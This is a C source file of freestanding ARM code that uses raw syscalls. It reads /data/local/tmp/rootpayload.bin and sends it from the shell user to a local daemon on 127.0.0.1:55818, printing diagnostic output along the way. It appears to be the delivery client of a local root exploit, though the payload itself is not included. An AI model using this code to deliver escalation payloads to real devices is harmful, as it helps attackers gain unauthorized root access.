/* Shell-UID client: reads /data/local/tmp/rootpayload.bin and sends it once to
 * 127.0.0.1:55818 (dmmd default bind port) within an 8 second window.
 */
static int sc3(int n,int a,int b,int c){register int r0 __asm__("r0")=a;register int r1 __asm__("r1")=b;register int r2 __asm__("r2")=c;register int r7 __asm__("r7")=n;__asm__ volatile("svc 0":"+r"(r0):"r"(r1),"r"(r2),"r"(r7):"memory","cc");return r0;}
static void out(const char*p,int n){while(n>0){int w=sc3(4,1,(int)p,n);if(w<=0)return;p+=w;n-=w;}}
static void num(int v){char b[12];int i=0;if(v<0){out("-",1);v=-v;}if(!v){out("0",1);return;}while(v){b[i++]='0'+v%10;v/=10;}while(i)out(b+--i,1);}
struct ts{int sec,nsec;};
void _start(void){
 char payload[1024];int len=-1;
 int f=sc3(5,(int)"/data/local/tmp/rootpayload.bin",0,0);
 if(f>=0){len=sc3(3,f,(int)payload,1023);sc3(6,f,0,0);if(len>0)payload[len]=0;}
 struct ts start,now;int attempts=0,fd=-1,cr=-1;
 sc3(263,1,(int)&start,0);
 out("CLIENT_READY payload=",21);num(len);out("\n",1);
 if(len>0)for(;;){sc3(263,1,(int)&now,0);
  if(now.sec-start.sec>8||(now.sec-start.sec==8&&now.nsec>=start.nsec))break;
  attempts++;fd=sc3(281,2,1,0);if(fd<0)continue;
  char sa[16];for(int i=0;i<16;i++)sa[i]=0;sa[0]=2;sa[2]=(char)(55818>>8);sa[3]=(char)(55818&255);sa[4]=127;sa[5]=0;sa[6]=0;sa[7]=1;
  cr=sc3(283,fd,(int)sa,16);if(cr==0)break;sc3(6,fd,0,0);
 }
 out("ATTEMPTS=",9);num(attempts);out(" CONNECT=",9);num(cr);out("\n",1);
 if(len>0&&cr==0){int w=sc3(4,fd,(int)payload,len);out("WRITE=",6);num(w);out("\n",1);
  char buf[512];int n=sc3(3,fd,(int)buf,511);out("REPLY=",6);num(n);out("\n",1);
  if(n>0){buf[n]=0;out("DATA=",5);out(buf,n);out("\n",1);}sc3(6,fd,0,0);}
 sc3(1,0,0,0);for(;;){}
}
